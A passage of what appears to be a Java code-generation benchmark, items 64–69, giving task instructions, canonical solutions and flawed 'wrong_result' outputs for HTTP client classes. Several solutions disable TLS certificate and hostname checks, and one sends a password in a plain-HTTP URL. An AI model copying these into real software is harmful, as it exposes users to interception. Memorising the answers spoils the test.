callback.onFailure(e);\n        }\n    }\n}"
  },
  {
    "Task_id": 64,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality using HttpURLConnection to make GET requests and handle responses.\n\nClass Description: The HttpClient class provides functionality to send HTTP GET requests to a specified URL and retrieve the response. It handles connection timeouts, sets appropriate request headers, and processes the response stream.\n\nAttributes: None\n\nMethods:\n- request: [Name](String url) -> String - Sends a GET request to the specified URL and returns the response body as a string. Sets connection timeout to 3 seconds, read timeout to 90 seconds, and configures appropriate request headers including content type and character encoding. Returns null if the request fails or response code is not 200.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpClient {\n\n    public String request(String url) {\n        HttpURLConnection connection = null;\n        BufferedReader reader = null;\n        try {\n            URL getUrl = new URL(url);\n            connection = (HttpURLConnection) getUrl.openConnection();\n            connection.setReadTimeout(90000);\n            connection.setConnectTimeout(3000);\n            connection.setRequestMethod(\"GET\");\n            connection.setRequestProperty(\"Accept-Charset\", \"utf-8\");\n            connection.setRequestProperty(\"Content-Type\", \"application/json\");\n            connection.setRequestProperty(\"Charset\", \"UTF-8\");\n            \n            if (200 == connection.getResponseCode()) {\n                reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), \"UTF-8\"));\n                StringBuilder result = new StringBuilder();\n                String line = null;\n                while ((line = reader.readLine()) != null) {\n                    result.append(line);\n                }\n                return result.toString();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n        return null;\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpClient {\n    public String request(String url) {\n        try {\n            URL obj = new URL(url);\n            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();\n            conn.setConnectTimeout(3000);\n            conn.setReadTimeout(90000);\n            conn.setRequestProperty(\"Content-Type\", \"application/json\");\n            conn.setRequestProperty(\"Accept-Charset\", \"utf-8\");\n            int responseCode = conn.getResponseCode();\n            if (responseCode != 200) {\n                return null;\n            }\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = in.readLine()) != null) {\n                response.append(line);\n            }\n            in.close();\n            return response.toString();\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}"
  },
  {
    "Task_id": 65,
    "Instruction": "Task Description: Implement a class that handles preloading of HTTP content in the background using a thread pool, with support for cancellation and blacklisting of failed URLs.\n\nClass Description: The PreloadTask class is a Runnable implementation that preloads HTTP content from a given URL up to a specified length. It manages connection timeouts, handles failures by blacklisting URLs, and supports task cancellation. The class works with an HttpProxyCacheServer to get proxied URLs and executes tasks through an ExecutorService.\n\nAttributes:\n- mRawUrl: String - The original URL to be preloaded\n- mPosition: int - The position/index of this preload task (optional tracking)\n- mCacheServer: HttpProxyCacheServer - The proxy server used to get cached URLs\n- mIsCanceled: boolean - Flag indicating if the task was canceled\n- mIsExecuted: boolean - Flag indicating if the task was executed\n- blackList: static List<String> - Shared list of URLs that failed to load\n\nMethods:\n- run(): void - The main execution method called by the thread pool, which starts the preload task if not canceled\n- start(): void - Internal method that performs the actual HTTP request and content preloading\n- executeOn(ExecutorService executorService): void - Submits the task to the provided executor service\n- cancel(): void - Cancels the task if it has been executed but not completed",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class PreloadTask implements Runnable {\n\n    public String mRawUrl;\n    public int mPosition;\n    public HttpProxyCacheServer mCacheServer;\n    private boolean mIsCanceled;\n    private boolean mIsExecuted;\n    private final static List<String> blackList = new ArrayList<>();\n\n    @Override\n    public void run() {\n        if (!mIsCanceled) {\n            start();\n        }\n        mIsExecuted = false;\n        mIsCanceled = false;\n    }\n\n    private void start() {\n        if (blackList.contains(mRawUrl)) return;\n        HttpURLConnection connection = null;\n        try {\n            String proxyUrl = mCacheServer.getProxyUrl(mRawUrl);\n            URL url = new URL(proxyUrl);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setConnectTimeout(5_000);\n            connection.setReadTimeout(5_000);\n            InputStream in = new BufferedInputStream(connection.getInputStream());\n            int length;\n            int read = -1;\n            byte[] bytes = new byte[8 * 1024];\n            while ((length = in.read(bytes)) != -1) {\n                read += length;\n                if (mIsCanceled || read >= PreloadManager.PRELOAD_LENGTH) {\n                    break;\n                }\n            }\n        } catch (Exception e) {\n            blackList.add(mRawUrl);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    public void executeOn(ExecutorService executorService) {\n        if (mIsExecuted) return;\n        mIsExecuted = true;\n        executorService.submit(this);\n    }\n\n    public void cancel() {\n        if (mIsExecuted) {\n            mIsCanceled = true;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class PreloadTask implements Runnable {\n    private String mRawUrl;\n    private int mPosition;\n    private HttpProxyCacheServer mCacheServer;\n    private boolean mIsCanceled;\n    private boolean mIsExecuted;\n    private static List<String> blackList = new ArrayList<>();\n\n    public PreloadTask(String rawUrl, HttpProxyCacheServer cacheServer, int position) {\n        mRawUrl = rawUrl;\n        mPosition = position;\n        mCacheServer = cacheServer;\n    }\n\n    @Override\n    public void run() {\n        if (mIsCanceled) {\n            return;\n        }\n        start();\n        mIsExecuted = true;\n    }\n\n    private void start() {\n        if (mIsCanceled) {\n            return;\n        }\n\n        try {\n            String proxiedUrl = mCacheServer.getProxiedUrl(mRawUrl);\n            byte[] content = loadContent(proxiedUrl, 1024);\n        } catch (Exception e) {\n            blackList.add(mRawUrl);\n        }\n    }\n\n    private byte[] loadContent(String url, int maxLength) throws IOException {\n        return new byte[0];\n    }\n\n    public void executeOn(ExecutorService executorService) {\n        executorService.submit(this);\n    }\n\n    public void cancel() {\n        mIsCanceled = true;\n    }\n}"
  },
  {
    "Task_id": 66,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously using HttpURLConnection, specifically designed for Android applications to fetch and process JSON data from a server.\n\nClass Description: HttpRequestHandler is a utility class containing an inner AsyncTask subclass (MyAsyncTaskgetNews) that performs HTTP GET requests in the background. It handles connection setup, timeout configuration, input stream processing, and JSON response parsing. The class demonstrates typical operations for user authentication flows.\n\nAttributes:\n- None (All required objects are created locally within methods)\n\nMethods:\n- MyAsyncTaskgetNews: [Inner Class] - Extends AsyncTask<String, String, String> to perform network operations off the UI thread\n  - doInBackground(String... params) -> String - Main execution method that:\n    1. Takes URL string as input parameter\n    2. Establishes HTTP connection with 7-second timeout\n    3. Reads input stream and converts to string\n    4. Publishes progress with response data\n    5. Returns null (results handled via progress updates)\n  \n  - onProgressUpdate(String... progress) -> void - UI thread callback that:\n    1. Parses JSON response\n    2. Handles \"user is added\" case by showing toast and initiating login\n    3. Processes successful login by saving user credentials\n    4. Handles errors via logging\n\nNote: The class assumes existence of helper classes (Operations for stream conversion, SaveSettings for persistence) and Android context availability via getApplicationContext().",
    "Canonical_solution": "import android.os.AsyncTask;\nimport java.io.BufferedInputStream;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String NewsData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    Operations operations = new Operations(getApplicationContext());\n                    NewsData = operations.ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONObject json = new JSONObject(progress[0]);\n                if (json.getString(\"msg\") == null)\n                    return;\n                if (json.getString(\"msg\").equalsIgnoreCase(\"user is added\")) {\n                    Toast.makeText(getApplicationContext(), json.getString(\"msg\"), Toast.LENGTH_LONG).show();\n                    String url = \"http://10.0.2.2/~hussienalrubaye/twitterserver/login.php?email=\" + etEmail.getText().toString() + \"&password=\" + etPassword.getText().toString();\n                    new MyAsyncTaskgetNews().execute(url);\n                }\n\n                if (json.getString(\"msg\").equalsIgnoreCase(\"Pass Login\")) {\n                    JSONArray UserInfo = new JSONArray(json.getString(\"info\"));\n                    JSONObject UserCreintal = UserInfo.getJSONObject(0);\n                    hideProgressDialog();\n                    SaveSettings saveSettings = new SaveSettings(getApplicationContext());\n                    saveSettings.SaveData(UserCreintal.getString(\"user_id\"));\n                    finish();\n                }\n            } catch (Exception ex) {\n                Log.d(\"er\", ex.getMessage());\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpRequestHandler {\n    public class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            String url = params[0];\n            try {\n                URL urlObj = new URL(url);\n                HttpURLConnection connection = (HttpURLConnection) urlObj.openConnection();\n                connection.setConnectTimeout(7000);\n                connection.setReadTimeout(7000);\n                connection.setRequestMethod(\"GET\");\n                int responseCode = connection.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_OK) {\n                    InputStream inputStream = connection.getInputStream();\n                    String response = Operations.convertStreamToString(inputStream);\n                    publishProgress(response);\n                    return null;\n                } else {\n                    return \"Error: \" + responseCode;\n                }\n            } catch (Exception e) {\n                return \"Error: \" + e.getMessage();\n            }\n        }\n\n        @Override\n        protected void onProgressUpdate(String... progress) {\n            super.onProgressUpdate(progress);\n            try {\n                JSONObject json = new JSONObject(progress[0]);\n                if (json.has(\"userAdded\")) {\n                    Context appContext = getApplicationContext();\n                    Toast.makeText(appContext, \"User is added\", Toast.LENGTH_SHORT).show();\n                    Intent intent = new Intent(appContext, LoginActivity.class);\n                    appContext.startActivity(intent);\n                } else if (json.has(\"status\") && json.getString(\"status\").equals(\"success\")) {\n                    SaveSettings.saveUserCredentials(json.getString(\"username\"), json.getString(\"password\"));\n                } else {\n                    Log.e(\"HttpRequestHandler\", \"Invalid response: \" + progress[0]);\n                }\n            } catch (JSONException e) {\n                Log.e(\"HttpRequestHandler\", \"JSON parsing error: \" + e.getMessage());\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 67,
    "Instruction": "Task Description: Create a Java utility class for making HTTP POST requests with JSON payloads, handling both HTTP and HTTPS connections, including SSL certificate verification bypass for HTTPS, and processing JSON responses.\n\nClass Description: XxlJobRemotingUtil is a utility class designed to handle remote HTTP communication with JSON payloads, particularly for interacting with the XXL-JOB scheduler. It provides methods for making POST requests with proper headers, timeout settings, and access token authentication.\n\nAttributes:\n- logger: Logger - SLF4J logger for error and debug logging\n- XXL_JOB_ACCESS_TOKEN: String - Constant string for the access token header name\n- trustAllCerts: TrustManager[] - Array of trust managers that don't validate certificates\n\nMethods:\n- trustAllHosts(HttpsURLConnection connection) -> void - Configures the HTTPS connection to trust all hosts and certificates\n- postBody(String url, String accessToken, int timeout, Object requestObj, Class returnTargClassOfT) -> ReturnT - Makes an HTTP POST request with JSON payload and processes the JSON response\n\nMethod Details:\n1. trustAllHosts(HttpsURLConnection connection) -> void\n   - Input: HttpsURLConnection connection - The HTTPS connection to configure\n   - Description: Sets up SSL context to trust all certificates and hosts for the given HTTPS connection\n\n2. postBody(String url, String accessToken, int timeout, Object requestObj, Class returnTargClassOfT) -> ReturnT\n   - Input:\n     - url: String - The target URL for the POST request\n     - accessToken: String - Authentication token for the request\n     - timeout: int - Read timeout in seconds\n     - requestObj: Object - The object to be serialized as JSON request body\n     - returnTargClassOfT: Class - The class type for deserializing the response\n   - Output: ReturnT - A generic return type containing either the successful response or error information\n   - Description: \n     1. Creates and configures an HTTP/HTTPS connection\n     2. Sets request headers including content type and access token\n     3. Serializes the request object to JSON and sends it\n     4. Reads and deserializes the JSON response\n     5. Handles errors and connection cleanup",
    "Canonical_solution": "import com.xxl.job.core.biz.model.ReturnT;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport javax.net.ssl.*;\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\n\npublic class XxlJobRemotingUtil {\n    private static Logger logger = LoggerFactory.getLogger(XxlJobRemotingUtil.class);\n    public static final String XXL_JOB_ACCESS_TOKEN = \"XXL-JOB-ACCESS-TOKEN\";\n\n    private static final TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {\n        public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[]{};\n        }\n        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        }\n        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        }\n    }};\n\n    private static void trustAllHosts(HttpsURLConnection connection) {\n        try {\n            SSLContext sc = SSLContext.getInstance(\"TLS\");\n            sc.init(null, trustAllCerts, new java.security.SecureRandom());\n            SSLSocketFactory newFactory = sc.getSocketFactory();\n            connection.setSSLSocketFactory(newFactory);\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        }\n        connection.setHostnameVerifier(new HostnameVerifier() {\n            public boolean verify(String hostname, SSLSession session) {\n                return true;\n            }\n        });\n    }\n\n    public static ReturnT postBody(String url, String accessToken, int timeout, Object requestObj, Class returnTargClassOfT) {\n        HttpURLConnection connection = null;\n        BufferedReader bufferedReader = null;\n        try {\n            URL realUrl = new URL(url);\n            connection = (HttpURLConnection) realUrl.openConnection();\n\n            boolean useHttps = url.startsWith(\"https\");\n            if (useHttps) {\n                HttpsURLConnection https = (HttpsURLConnection) connection;\n                trustAllHosts(https);\n            }\n\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setUseCaches(false);\n            connection.setReadTimeout(timeout * 1000);\n            connection.setConnectTimeout(3 * 1000);\n            connection.setRequestProperty(\"connection\", \"Keep-Alive\");\n            connection.setRequestProperty(\"Content-Type\", \"application/json;charset=UTF-8\");\n            connection.setRequestProperty(\"Accept-Charset\", \"application/json;charset=UTF-8\");\n\n            if(accessToken!=null && accessToken.trim().length()>0){\n                connection.setRequestProperty(XXL_JOB_ACCESS_TOKEN, accessToken);\n            }\n\n            connection.connect();\n\n            if (requestObj != null) {\n                String requestBody = GsonTool.toJson(requestObj);\n                DataOutputStream dataOutputStream = new DataOutputStream(connection.getOutputStream());\n                dataOutputStream.write(requestBody.getBytes(\"UTF-8\"));\n                dataOutputStream.flush();\n                dataOutputStream.close();\n            }\n\n            int statusCode = connection.getResponseCode();\n            if (statusCode != 200) {\n                return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting fail, StatusCode(\"+ statusCode +\") invalid. for url : \" + url);\n            }\n\n            bufferedReader = new BufferedReader(new InputStreamReader(connection.getInputStream(), \"UTF-8\"));\n            StringBuilder result = new StringBuilder();\n            String line;\n            while ((line = bufferedReader.readLine()) != null) {\n                result.append(line);\n            }\n            String resultJson = result.toString();\n\n            try {\n                ReturnT returnT = GsonTool.fromJson(resultJson, ReturnT.class, returnTargClassOfT);\n                return returnT;\n            } catch (Exception e) {\n                logger.error(\"xxl-rpc remoting (url=\"+url+\") response content invalid(\"+ resultJson +\").\", e);\n                return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting (url=\"+url+\") response content invalid(\"+ resultJson +\").\");\n            }\n\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n            return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting error(\"+ e.getMessage() +\"), for url : \" + url);\n        } finally {\n            try {\n                if (bufferedReader != null) {\n                    bufferedReader.close();\n                }\n                if (connection != null) {\n                    connection.disconnect();\n                }\n            } catch (Exception e2) {\n                logger.error(e2.getMessage(), e2);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.StringWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\nimport java.security.cert.X509Certificate;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSession;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class XxlJobRemotingUtil {\n    private static final Logger logger = LoggerFactory.getLogger(XxlJobRemotingUtil.class);\n    private static final String XXL_JOB_ACCESS_TOKEN = \"XXL_JOB_ACCESS_TOKEN\";\n    private final TrustManager[] trustAllCerts;\n\n    public XxlJobRemotingUtil() {\n        trustAllCerts = new TrustManager[]{new X509TrustManager() {\n            public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n            public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n            public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n        }};\n    }\n\n    public void trustAllHosts(HttpsURLConnection connection) {\n        try {\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, trustAllCerts, new SecureRandom());\n            connection.setSSLSocketFactory(sslContext.getSocketFactory());\n            connection.setHostnameVerifier((hostname, session) -> true);\n        } catch (NoSuchAlgorithmException | KeyManagementException e) {\n            logger.error(\"Failed to configure SSL context\", e);\n        }\n    }\n\n    public <ReturnT> ReturnT postBody(String url, String accessToken, int timeout, Object requestObj, Class<ReturnT> returnTargClassOfT) throws Exception {\n        URL obj = new URL(url);\n        HttpURLConnection connection = (obj.protocol.equals(\"https\") ? (HttpsURLConnection) obj.openConnection() : (HttpURLConnection) obj.openConnection());\n        trustAllHosts((HttpsURLConnection) connection);\n        connection.setConnectTimeout(timeout * 1000);\n        connection.setReadTimeout(timeout * 1000);\n        connection.setRequestMethod(\"POST\");\n        connection.setRequestProperty(\"Content-Type\", \"application/json\");\n        connection.setRequestProperty(XXL_JOB_ACCESS_TOKEN, accessToken);\n\n        ObjectMapper mapper = new ObjectMapper();\n        StringWriter writer = new StringWriter();\n        mapper.writeValue(writer, requestObj);\n        byte[] jsonBytes = writer.toString().getBytes(\"UTF-8\");\n        connection.setDoOutput(true);\n        try (OutputStream os = connection.getOutputStream()) {\n            os.write(jsonBytes);\n        }\n\n        int responseCode = connection.getResponseCode();\n        if (responseCode != HttpURLConnection.HTTP_OK) {\n            logger.error(\"HTTP error code: {}\", responseCode);\n            throw new RuntimeException(\"HTTP error code: \" + responseCode);\n        }\n\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n            StringBuilder response = new StringBuilder();\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            return mapper.readValue(response.toString(), returnTargClassOfT);\n        }\n    }\n}"
  },
  {
    "Task_id": 68,
    "Instruction": "Task Description: Create a utility class for making HTTP POST requests with configurable timeouts and form data submission capabilities.\n\nClass Description: TinyIdHttpUtils is a utility class that provides static methods for performing HTTP POST requests. It handles connection management, timeout configuration, form data encoding, and response reading. The class is designed to be thread-safe and includes proper resource cleanup.\n\nAttributes:\n- logger: Logger - Used for logging errors and warnings during HTTP operations\n\nMethods:\n- post(String url, Integer readTimeout, Integer connectTimeout) -> String - Makes a POST request to the specified URL with given timeout values\n- post(String url, Map<String,String> form, Integer readTimeout, Integer connectTimeout) -> String - Makes a POST request with form data to the specified URL with given timeout values",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class TinyIdHttpUtils {\n\n    private static final Logger logger = Logger.getLogger(TinyIdHttpUtils.class.getName());\n\n    private TinyIdHttpUtils() {\n    }\n\n    public static String post(String url, Integer readTimeout, Integer connectTimeout) {\n        return post(url, null, readTimeout, connectTimeout);\n    }\n\n    public static String post(String url, Map<String, String> form, Integer readTimeout, Integer connectTimeout) {\n        HttpURLConnection conn = null;\n        OutputStreamWriter os = null;\n        BufferedReader rd = null;\n        StringBuilder param = new StringBuilder();\n        StringBuilder sb = new StringBuilder();\n        String line = null;\n        String response = null;\n        if (form != null) {\n            for (Map.Entry<String, String> entry : form.entrySet()) {\n                String key = entry.getKey();\n                if (param.length() != 0) {\n                    param.append(\"&\");\n                }\n                param.append(key).append(\"=\").append(entry.getValue());\n            }\n        }\n        try {\n            conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n            conn.setDoInput(true);\n            conn.setReadTimeout(readTimeout);\n            conn.setConnectTimeout(connectTimeout);\n            conn.setUseCaches(false);\n            conn.connect();\n            os = new OutputStreamWriter(conn.getOutputStream(), \"UTF-8\");\n            os.write(param.toString());\n            os.flush();\n            rd = new BufferedReader(new InputStreamReader(conn.getInputStream(), \"UTF-8\"));\n            while ((line = rd.readLine()) != null) {\n                sb.append(line);\n            }\n            response = sb.toString();\n        } catch (Exception e) {\n            logger.log(Level.SEVERE, \"error post url:\" + url + param, e);\n        } finally {\n            try {\n                if (os != null) {\n                    os.close();\n                }\n                if (rd != null) {\n                    rd.close();\n                }\n                if (conn != null) {\n                    conn.disconnect();\n                }\n            } catch (IOException e) {\n                logger.log(Level.WARNING, \"error close conn\", e);\n            }\n        }\n        return response;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.io.BufferedReader;\nimport java.io.ByteArrayOutputStream;\nimport java.io.Closeable;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.StringWriter;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Map;\nimport java.util.logging.Logger;\n\npublic class TinyIdHttpUtils {\n    private static final Logger logger = Logger.getLogger(TinyIdHttpUtils.class.getName());\n\n    public static synchronized String post(String url, Integer readTimeout, Integer connectTimeout) throws IOException {\n        try {\n            URL obj = new URL(url);\n            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setConnectTimeout(connectTimeout);\n            conn.setReadTimeout(readTimeout);\n            int responseCode = conn.getResponseCode();\n            BufferedReader in = null;\n            ByteArrayOutputStream responseStream = new ByteArrayOutputStream();\n            try {\n                if (responseCode >= 200 && responseCode < 300) {\n                    in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                } else {\n                    in = new BufferedReader(new InputStreamReader(conn.getErrorStream()));\n                }\n                char[] buffer = new char[1024];\n                int bytesRead;\n                while ((bytesRead = in.read(buffer)) != -1) {\n                    responseStream.write(buffer, 0, bytesRead);\n                }\n            } finally {\n                if (in != null) {\n                    in.close();\n                }\n            }\n            return responseStream.toString(StandardCharsets.UTF_8);\n        } catch (IOException e) {\n            logger.severe(\"Error occurred during POST request: \" + e.getMessage());\n            throw e;\n        }\n    }\n\n    public static synchronized String post(String url, Map<String, String> form, Integer readTimeout, Integer connectTimeout) throws IOException {\n        try {\n            URL obj = new URL(url);\n            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setConnectTimeout(connectTimeout);\n            conn.setReadTimeout(readTimeout);\n            conn.setDoOutput(true);\n            String formData = buildFormData(form);\n            try (OutputStream os = conn.getOutputStream()) {\n                os.write(formData.getBytes(StandardCharsets.UTF_8));\n                os.flush();\n            }\n            int responseCode = conn.getResponseCode();\n            BufferedReader in = null;\n            ByteArrayOutputStream responseStream = new ByteArrayOutputStream();\n            try {\n                if (responseCode >= 200 && responseCode < 300) {\n                    in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                } else {\n                    in = new BufferedReader(new InputStreamReader(conn.getErrorStream()));\n                }\n                char[] buffer = new char[1024];\n                int bytesRead;\n                while ((bytesRead = in.read(buffer)) != -1) {\n                    responseStream.write(buffer, 0, bytesRead);\n                }\n            } finally {\n                if (in != null) {\n                    in.close();\n                }\n            }\n            return responseStream.toString(StandardCharsets.UTF_8);\n        } catch (IOException e) {\n            logger.severe(\"Error occurred during POST request with form data: \" + e.getMessage());\n            throw e;\n        }\n    }\n\n    private static String buildFormData(Map<String, String> form) {\n        StringBuilder formData = new StringBuilder();\n        for (Map.Entry<String, String> entry : form.entrySet()) {\n            String key = entry.getKey();\n            String value = entry.getValue();\n            try {\n                formData.append(encodeParameter(key)).append(\"=\").append(encodeParameter(value));\n            } catch (UnsupportedEncodingException e) {\n                throw new RuntimeException(\"Encoding failed\", e);\n            }\n            formData.append(\"&\");\n        }\n        return formData.toString().trim();\n    }\n\n    private static String encodeParameter(String value) throws UnsupportedEncodingException {\n        return java.net.URLEncoder.encode(value, StandardCharsets.UTF_8);\n    }\n}"
  },
  {
    "Task_id": 69,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests with support for both GET and POST methods, handling parameters, headers, and SSL configurations.\n\nClass Description: SimpleHttpUtils is a utility class that provides methods to perform HTTP requests (GET/POST) with configurable parameters, headers, timeouts, and SSL settings. It handles URL encoding, parameter serialization, and response processing.\n\nAttributes:\n- logger: Log - Logger instance for logging messages\n- DEFAULT_CHARSET: String - Default character encoding (utf-8)\n- HTTP_METHOD_POST: String - Constant for POST method\n- HTTP_METHOD_GET: String - Constant for GET method\n- HTTP_ERROR_MESSAGE: String - Key for error messages\n- DEFAULT_READ_TIMEOUT: int - Default read timeout in milliseconds\n- DEFAULT_CONNECT_TIMEOUT: int - Default connection timeout in milliseconds\n- HTTP_PREFIX: String - HTTP URL prefix\n- HTTPS_PREFIX: String - HTTPS URL prefix\n- MAX_FETCHSIZE: int - Maximum fetch size limit\n- trustAnyManagers: TrustManager[] - Array of trust managers for SSL\n\nMethods:\n- httpPost(String url, Map params) -> String - Makes an HTTP POST request to the specified URL with given parameters\n- httpGet(String url, Map params) -> String - Makes an HTTP GET request to the specified URL with given parameters\n- httpRequest(String url, Map<String,String> params, String method, String charSet, Map<String,String> headers) -> String - Makes an HTTP request with configurable method, charset and headers\n- httpRequest(SimpleHttpParam httpParam) -> SimpleHttpResult - Makes an HTTP request with comprehensive configuration options\n- mapToQueryString(Map parameters, String charSet) -> String - Converts a parameter map to a URL-encoded query string\n- urlEncode(String url, String charSet) -> String - URL-encodes a given string\n- setSSLSocketFactory(HttpURLConnection urlConn, boolean sslVerify, boolean hostnameVerify, TrustKeyStore trustKeyStore, ClientKeyStore clientKeyStore) -> void - Configures SSL settings for the connection\n- makeStringList(Object value) -> List<String> - Converts an input value to a list of strings\n\nNested Classes:\n- TrustAnyTrustManager: Implements X509TrustManager for custom SSL certificate handling\n- TrustAnyHostnameVerifier: Implements HostnameVerifier for custom hostname verification",
    "Canonical_solution": "import org.apache.commons.logging.Log;\nimport org.apache.commons.logging.LogFactory;\nimport javax.net.ssl.*;\nimport java.io.*;\nimport java.lang.reflect.Array;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLDecoder;\nimport java.net.URLEncoder;\nimport java.nio.charset.Charset;\nimport java.security.KeyStore;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.*;\nimport java.util.Map.Entry;\n\npublic class SimpleHttpUtils {\n    private static final Log logger = LogFactory.getLog(SimpleHttpUtils.class);\n    public static final String DEFAULT_CHARSET = \"utf-8\";\n    public static final String HTTP_METHOD_POST = \"POST\";\n    public static final String HTTP_METHOD_GET = \"GET\";\n    public static final String HTTP_ERROR_MESSAGE = \"http_error_message\";\n    public static final int DEFAULT_READ_TIMEOUT = 20000;\n    public static final int DEFAULT_CONNECT_TIMEOUT = 10000;\n    public static final String HTTP_PREFIX = \"http://\";\n    public static final String HTTPS_PREFIX = \"https://\";\n    public static final int MAX_FETCHSIZE = 5000;\n    private static TrustManager[] trustAnyManagers = new TrustManager[]{new TrustAnyTrustManager()};\n\n    static {\n        System.setProperty(\"sun.net.inetaddr.ttl\", \"3600\");\n    }\n\n    public static String httpPost(String url, Map params) {\n        return httpRequest(url, params, HTTP_METHOD_POST, DEFAULT_CHARSET, null);\n    }\n\n    public static String httpGet(String url, Map params) {\n        return httpRequest(url, params, HTTP_METHOD_GET, DEFAULT_CHARSET, null);\n    }\n\n    public static String httpRequest(String url, Map<String,String> params, String method,\n                                    String charSet, Map<String,String> headers) {\n        SimpleHttpParam param = new SimpleHttpParam(url);\n        if(null != param){\n            param.setParameters(params);\n        }\n        if(null != headers){\n            param.setHeaders(headers);\n        }\n        param.setCharSet(charSet);\n        param.setMethod(method);\n        SimpleHttpResult result = httpRequest(param);\n        if(result==null || !result.isSuccess()){\n            return null;\n        }else{\n            return result.getContent();\n        }\n    }\n\n    public static SimpleHttpResult httpRequest(SimpleHttpParam httpParam) {\n        String url = httpParam.getUrl();\n        Map<String,Object> parameters = httpParam.getParameters();\n        String sMethod = httpParam.getMethod();\n        String charSet = httpParam.getCharSet();\n        boolean sslVerify = httpParam.isSslVerify();\n        int maxResultSize = httpParam.getMaxResultSize();\n        Map<String,Object> headers = httpParam.getHeaders();\n        int 